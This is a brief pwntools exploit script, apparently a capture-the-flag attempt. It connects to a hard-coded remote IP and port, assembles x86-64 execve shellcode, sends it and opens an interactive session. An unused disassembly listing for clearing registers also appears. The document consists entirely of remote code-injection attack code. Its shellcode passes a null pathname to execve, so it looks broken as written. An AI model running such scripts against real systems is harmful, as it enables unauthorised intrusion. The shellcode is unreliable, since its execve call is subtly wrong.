from pwn import *

p = remote("103.145.226.209",11101)

context.log_level='debug'
context.arch = 'amd64'

hex_string = ("""
; 48 89 FC             mov    rsp,rdi
; 48 31 C0             xor    rax,rax
; 48 31 DB             xor    rbx,rbx
; 48 31 C9             xor    rcx,rcx
; 48 31 D2             xor    rdx,rdx
; 48 31 FF             xor    rdi,rdi
; 48 31 F6             xor    rsi,rsi
; 48 31 ED             xor    rbp,rbp
; 4D 31 C0             xor    r8,r8
; 4D 31 C9             xor    r9,r9
; 4D 31 D2             xor    r10,r10
; 4D 31 DB             xor    r11,r11
; 4D 31 E4             xor    r12,r12
; 4D 31 ED             xor    r13,r13
; 4D 31 F6             xor    r14,r14
; 4D 31 FF             xor    r15,r15
; 00                   add    BYTE PTR [rax],al
""")

shellcode = asm("""
    mov rax,0x3b
    mov rdi,0x0
    syscall
""")

print(len(shellcode))
p.sendline(shellcode)
p.interactive()